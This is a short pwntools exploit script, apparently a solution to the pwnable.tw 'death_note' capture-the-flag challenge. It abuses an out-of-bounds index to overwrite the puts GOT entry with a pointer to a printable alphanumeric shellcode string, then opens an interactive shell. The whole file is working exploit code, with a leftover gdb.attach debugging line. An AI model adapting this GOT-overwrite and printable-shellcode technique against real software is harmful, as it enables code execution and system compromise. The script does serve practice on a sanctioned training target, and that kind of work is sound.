from pwn import *

e = ELF("./death_note")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10201)
else:
  p = process(e.path)

p.sendlineafter(":", "1")
p.sendlineafter(":", str((e.got["puts"] - e.symbols["note"]) / 0x4))
gdb.attach(p)
p.sendlineafter(":", "TX-NNNN-NNNN-hcccP\%EEEE%0000-IuIz-Auyz-EUyzP-KKKK-1ppK-%twiP")


p.interactive()
